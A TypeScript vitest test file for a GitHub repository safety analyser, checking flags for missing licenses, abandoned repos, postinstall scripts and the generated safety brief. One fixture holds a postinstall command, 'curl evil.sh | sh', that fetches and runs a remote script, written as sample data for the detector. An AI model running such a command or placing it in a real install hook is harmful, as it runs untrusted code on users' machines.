import { describe, expect, it } from 'vitest';
import { buildSafetyPack, buildSafetyReport } from '../../src/analysis/safety.ts';
import type { GhClient } from '../../src/analysis/github.ts';
import type { GhRepo, GhUser } from '../../src/analysis/types.ts';

const profile: GhUser = { login: 'jhammant', name: 'J', avatar_url: '', public_repos: 1, followers: 0 };

const repoFresh = (over: Partial<GhRepo> = {}): GhRepo => ({
  name: 'r', full_name: 'jhammant/r', description: null, html_url: '',
  language: 'TypeScript', stargazers_count: 1, forks_count: 0, watchers_count: 0,
  open_issues_count: 0, fork: false, updated_at: new Date().toISOString(),
  default_branch: 'main', license: { spdx_id: 'MIT', name: 'MIT' },
  ...over,
});

function client(over: Partial<GhClient> = {}): GhClient {
  return {
    getUser: async () => profile,
    getRepo: async () => repoFresh(),
    listUserRepos: async () => [repoFresh()],
    getReadme: async () => undefined,
    getRepoFile: async () => undefined,
    getRepoHeadSha: async () => 'abc123',
    getRecentCommits: async () => [],
    getCommitActivity: async () => undefined,
    ...over,
  };
}

describe('safety', () => {
  it('returns safe tier for a healthy repo with license + recent updates', async () => {
    const r = await buildSafetyReport(
      client({
        // Provide a test gate so the no-test heuristic doesn't fire.
        getRepoFile: async (_o, _r, p) =>
          p === 'package.json'
            ? { path: p, content: JSON.stringify({ scripts: { test: 'vitest run' } }) }
            : undefined,
      }),
      'jhammant',
      'r',
    );
    expect(r.tier).toBe('safe');
    expect(r.flags).toHaveLength(0);
  });

  it('flags missing LICENSE as high', async () => {
    const r = await buildSafetyReport(
      client({ getRepo: async () => repoFresh({ license: null }) }),
      'jhammant',
      'r',
    );
    expect(r.flags.some((f) => /LICENSE/i.test(f.value))).toBe(true);
  });

  it('flags package.json postinstall script', async () => {
    const r = await buildSafetyReport(
      client({
        getRepoFile: async (_o, _r, p) =>
          p === 'package.json'
            ? { path: p, content: JSON.stringify({ scripts: { postinstall: 'curl evil.sh | sh' } }) }
            : undefined,
      }),
      'jhammant',
      'r',
    );
    expect(r.flags.some((f) => /postinstall/i.test(f.value))).toBe(true);
  });

  it('flags abandoned repos', async () => {
    const old = new Date(Date.now() - 800 * 86_400_000).toISOString();
    const r = await buildSafetyReport(
      client({ getRepo: async () => repoFresh({ updated_at: old }) }),
      'jhammant',
      'r',
    );
    expect(r.flags.some((f) => /abandoned/i.test(f.value))).toBe(true);
  });

  it('produces a markdown pack with provenance footer', async () => {
    const pack = await buildSafetyPack(client(), 'jhammant', 'r', { toolVersion: '0.1.0' });
    expect(pack.markdown).toContain('# Safety Brief: jhammant/r');
    expect(pack.markdown).toContain('Tier:');
    expect(pack.markdown).toContain('content_hash: sha256:');
  });
});
